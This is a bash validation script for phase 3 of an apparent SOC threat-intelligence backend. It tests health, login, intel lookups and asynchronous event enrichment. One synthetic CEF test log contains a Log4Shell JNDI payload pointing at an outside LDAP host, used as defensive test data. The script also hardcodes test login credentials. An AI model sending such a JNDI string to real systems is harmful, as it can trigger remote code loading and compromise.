## 12) `validate_phase3.sh`

#!/bin/bash
set -euo pipefail

BACKEND_URL="${BACKEND_URL:-http://localhost:8000}"
PASS=0
FAIL=0
WARN=0

GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
BOLD='\033[1m'
NC='\033[0m'

pass_test() { PASS=$((PASS + 1)); echo -e "  ${GREEN}✅ PASS${NC} — $1"; }
fail_test() { FAIL=$((FAIL + 1)); echo -e "  ${RED}❌ FAIL${NC} — $1"; [ -n "${2:-}" ] && echo -e "         ${RED}$2${NC}"; }
warn_test() { WARN=$((WARN + 1)); echo -e "  ${YELLOW}⚠️  WARN${NC} — $1"; }
section() { echo ""; echo -e "${BOLD}━━━ $1 ━━━${NC}"; }

extract_json_field() {
  local field="$1"
  FIELD_NAME="$field" python3 -c '
import json, os, sys
field = os.environ["FIELD_NAME"]
try:
    data = json.load(sys.stdin)
except Exception:
    print("")
    raise SystemExit(0)
value = data
for part in field.split("."):
    if isinstance(value, dict):
        value = value.get(part)
    else:
        value = None
        break
if value is None:
    print("")
elif isinstance(value, (dict, list)):
    print(json.dumps(value))
else:
    print(value)
'
}

echo ""
echo -e "${BOLD}╔═══════════════════════════════════════════════════════════╗${NC}"
echo -e "${BOLD}║    ACCC Phase 3 — Validation Script                      ║${NC}"
echo -e "${BOLD}║    Live Threat Intelligence                              ║${NC}"
echo -e "${BOLD}╚═══════════════════════════════════════════════════════════╝${NC}"

section "1. Backend Health"
MAX_WAIT=90
ELAPSED=0
while [ $ELAPSED -lt $MAX_WAIT ]; do
    if curl -sf "${BACKEND_URL}/health" > /dev/null 2>&1; then break; fi
    sleep 2
    ELAPSED=$((ELAPSED + 2))
done

if [ $ELAPSED -ge $MAX_WAIT ]; then
    fail_test "Backend not reachable after ${MAX_WAIT}s"
    exit 1
fi
pass_test "Backend is healthy"

BACKEND_CONTAINER=$(docker compose ps -q backend 2>/dev/null || true)
if [ -z "$BACKEND_CONTAINER" ]; then
    fail_test "Could not determine backend container ID"
    exit 1
fi
pass_test "Backend container ID resolved"

section "2. Phase 2 Smoke Check"
LOGIN_RESP=$(curl -sf -X POST "${BACKEND_URL}/auth/login" \
    -H "Content-Type: application/json" \
    -d '{"username":"analyst","password":"analyst123"}' \
    -c /tmp/accc_phase3_cookies 2>/dev/null || echo "FAIL")
TOKEN=$(echo "$LOGIN_RESP" | extract_json_field access_token)

if [ -n "$TOKEN" ]; then
    pass_test "analyst login successful"
else
    fail_test "analyst login failed" "$LOGIN_RESP"
    exit 1
fi

AUTH_ME=$(curl -sf "${BACKEND_URL}/auth/me" \
    -H "Authorization: Bearer ${TOKEN}" 2>/dev/null || echo "FAIL")
AUTH_USER=$(echo "$AUTH_ME" | extract_json_field username)
if [ "$AUTH_USER" = "analyst" ]; then
    pass_test "protected auth endpoint still works"
else
    fail_test "GET /auth/me failed" "$AUTH_ME"
fi

CHAT_POST=$(curl -s -X POST "${BACKEND_URL}/api/v1/chat/message" \
    -H "Authorization: Bearer ${TOKEN}" \
    -H "Content-Type: application/json" \
    -d '{"query":"Give me a brief SOC explanation of port scans.","session_id":null}' \
    -w '\nHTTP_STATUS:%{http_code}' 2>/dev/null)
CHAT_HTTP=$(echo "$CHAT_POST" | awk -F: '/HTTP_STATUS/ {print $2}' | tail -1)
CHAT_JSON=$(echo "$CHAT_POST" | sed '/^HTTP_STATUS:/d')
CHAT_SESSION=$(echo "$CHAT_JSON" | extract_json_field session_id)

if [ "$CHAT_HTTP" = "202" ] && [ -n "$CHAT_SESSION" ]; then
    pass_test "Phase 2 chat endpoint still accepts requests"
else
    fail_test "Phase 2 chat endpoint regression detected" "$CHAT_POST"
fi

section "3. Phase 3 Module Imports + Graceful Fallback"
IMPORT_CHECK=$(docker exec -i "$BACKEND_CONTAINER" python3 - <<'PY' 2>&1
import asyncio
import json
import sys
sys.path.insert(0, "/app/backend")

from services.intel.geoip import lookup_geoip, is_private_or_reserved_ip
from services.intel.abuseipdb import lookup_abuseipdb
from services.intel.nvd_cve import lookup_cve
from services.ingestion.enrichment import enrich_event_after_ingest
from services.scoring import reputation_multiplier

async def main():
    geo_private = await lookup_geoip("10.0.0.1")
    abuse_no_key = await lookup_abuseipdb("8.8.8.8")
    cve = await lookup_cve("CVE-2021-44228")
    print(json.dumps({
        "private_skip": is_private_or_reserved_ip("10.0.0.1") and geo_private is None,
        "abuse_graceful": abuse_no_key is None or isinstance(abuse_no_key, dict),
        "cve_ok": isinstance(cve, dict) and cve.get("cve_id") == "CVE-2021-44228",
        "rep_multiplier": reputation_multiplier(80),
    }))

asyncio.run(main())
PY
)

IMPORT_OK=$(python3 -c '
import json, sys
payload = json.load(sys.stdin)
assert payload["private_skip"] is True
assert payload["abuse_graceful"] is True
assert payload["cve_ok"] is True
assert float(payload["rep_multiplier"]) >= 1.8 - 1e-9
print("OK")
' <<< "$IMPORT_CHECK" 2>/dev/null || echo FAIL)

if [ "$IMPORT_OK" = "OK" ]; then
    pass_test "GeoIP, AbuseIPDB fallback, NVD, enrichment, and scoring imports behave correctly"
else
    fail_test "Phase 3 module import/runtime check failed" "${IMPORT_CHECK:0:700}"
fi

section "4. Intel API Endpoints"
IP_INTEL=$(curl -sf "${BACKEND_URL}/api/v1/intel/ip/8.8.8.8" \
    -H "Authorization: Bearer ${TOKEN}" 2>/dev/null || echo "FAIL")
IP_OK=$(python3 -c '
import json, sys
payload = json.load(sys.stdin)
assert payload["ip"] == "8.8.8.8"
assert "geo" in payload
assert "reputation" in payload
assert "available" in payload
assert "degraded" in payload
print("OK")
' <<< "$IP_INTEL" 2>/dev/null || echo FAIL)

if [ "$IP_OK" = "OK" ]; then
    pass_test "GET /api/v1/intel/ip/{ip} works"
else
    fail_test "IP intel endpoint failed" "$IP_INTEL"
fi

CVE_INTEL=$(curl -sf "${BACKEND_URL}/api/v1/intel/cve/CVE-2021-44228" \
    -H "Authorization: Bearer ${TOKEN}" 2>/dev/null || echo "FAIL")
CVE_OK=$(python3 -c '
import json, sys
payload = json.load(sys.stdin)
assert payload["cve_id"] == "CVE-2021-44228"
assert payload["available"] is True
assert payload.get("cvss_score") is not None
print("OK")
' <<< "$CVE_INTEL" 2>/dev/null || echo FAIL)

if [ "$CVE_OK" = "OK" ]; then
    pass_test "GET /api/v1/intel/cve/{cve_id} works"
else
    fail_test "CVE intel endpoint failed" "${CVE_INTEL:0:700}"
fi

section "5. Async Enrichment After Ingestion"
RAW_LOG=$(python3 - <<'PY'
import json, time
print(json.dumps({
  "raw_log": f"CEF:0|Qualys|Scanner|10.0|CVE-2021-44228|Log4Shell Scan Detected|9|src=45.142.212.100 dst=10.0.1.50 spt=54321 dpt=443 proto=TCP act=blocked deviceAddress=10.0.1.50 rt={int(time.time()*1000)} cs1=CVE-2021-44228-SCAN msg=${{jndi:ldap://45.142.212.100:1389/exploit}}"
}))
PY
)

INGEST_RESP=$(curl -sf -X POST "${BACKEND_URL}/api/v1/events/ingest" \
    -H "Content-Type: application/json" \
    -d "$RAW_LOG" 2>/dev/null || echo "FAIL")
EVENT_ID=$(echo "$INGEST_RESP" | extract_json_field event_id)

if [ -n "$EVENT_ID" ]; then
    pass_test "event ingested successfully (${EVENT_ID})"
else
    fail_test "event ingestion failed" "$INGEST_RESP"
    exit 1
fi

FIRST_EVENT=$(curl -sf "${BACKEND_URL}/api/v1/events/${EVENT_ID}" 2>/dev/null || echo "FAIL")
FIRST_READY=$(python3 -c '
import json, sys
payload = json.load(sys.stdin)
ready = bool(payload.get("geo_country") and payload.get("relevant_cves") and payload.get("severity_score") is not None)
print("YES" if ready else "NO")
' <<< "$FIRST_EVENT" 2>/dev/null || echo NO)

ENRICHED_JSON=""
for _ in $(seq 1 30); do
    CANDIDATE=$(curl -sf "${BACKEND_URL}/api/v1/events/${EVENT_ID}" 2>/dev/null || true)
    if [ -z "$CANDIDATE" ]; then
        sleep 2
        continue
    fi

    READY=$(python3 -c '
import json, sys
payload = json.load(sys.stdin)
has_geo = bool(payload.get("geo_country"))
has_cve = bool(payload.get("relevant_cves"))
has_score = payload.get("severity_score") is not None
print("YES" if (has_geo and has_cve and has_score) else "NO")
' <<< "$CANDIDATE" 2>/dev/null || echo NO)

    if [ "$READY" = "YES" ]; then
        ENRICHED_JSON="$CANDIDATE"
        break
    fi
    sleep 2
done

if [ -n "$ENRICHED_JSON" ]; then
    pass_test "async enrichment updated the event row after ingestion"
else
    fail_test "event was ingested but enrichment fields never appeared" "${FIRST_EVENT:0:700}"
fi

ASYNC_EVIDENCE=$(python3 - "$FIRST_EVENT" "$ENRICHED_JSON" <<'PY' 2>/dev/null || echo NO
import json
import sys

first_payload = json.loads(sys.argv[1])
second_payload = json.loads(sys.argv[2])

first_ready = bool(
    first_payload.get("geo_country")
    and first_payload.get("relevant_cves")
    and first_payload.get("severity_score") is not None
)
second_ready = bool(
    second_payload.get("geo_country")
    and second_payload.get("relevant_cves")
    and second_payload.get("severity_score") is not None
)

print("YES" if ((not first_ready) and second_ready) else "NO")
PY
)

if [ "$ASYNC_EVIDENCE" = "YES" ]; then
    pass_test "enrichment is observably asynchronous"
else
    warn_test "first read already looked enriched; background execution still appears functional"
fi

section "6. Stored Enrichment Fields"
EVENT_CHECK=$(python3 -c '
import json, sys
payload = json.load(sys.stdin)
assert payload.get("geo_country")
assert payload.get("severity_score") is not None
assert float(payload.get("severity_score")) > 0
assert "CVE-2021-44228" in (payload.get("relevant_cves") or [])
print("OK")
' <<< "$ENRICHED_JSON" 2>/dev/null || echo FAIL)

if [ "$EVENT_CHECK" = "OK" ]; then
    pass_test "GeoIP, relevant_cves, and contextual severity_score were stored on the event"
else
    fail_test "Enriched event fields invalid" "${ENRICHED_JSON:0:700}"
fi

section "7. Phase 2 Triage Still Works After Phase 3"
TRIAGE_RESP=$(curl -sf "${BACKEND_URL}/api/v1/events/${EVENT_ID}/triage" \
    -H "Authorization: Bearer ${TOKEN}" 2>/dev/null || echo "FAIL")
TRIAGE_OK=$(python3 -c '
import json, sys
payload = json.load(sys.stdin)
assert payload.get("event_id")
assert 0.0 <= float(payload.get("confidence")) <= 1.0
assert 0.0 <= float(payload.get("severity_score")) <= 1.0
assert payload.get("mitre_tactic")
print("OK")
' <<< "$TRIAGE_RESP" 2>/dev/null || echo FAIL)

if [ "$TRIAGE_OK" = "OK" ]; then
    pass_test "AI triage still works after Phase 3 integration"
else
    fail_test "Phase 2 triage regression detected" "${TRIAGE_RESP:0:700}"
fi

echo ""
echo -e "${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${BOLD}Validation Summary:${NC} ${GREEN}${PASS} PASS${NC} / ${RED}${FAIL} FAIL${NC} / ${YELLOW}${WARN} WARN${NC}"
echo -e "${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"

if [ "$FAIL" -ne 0 ]; then
    exit 1
fi
exit 0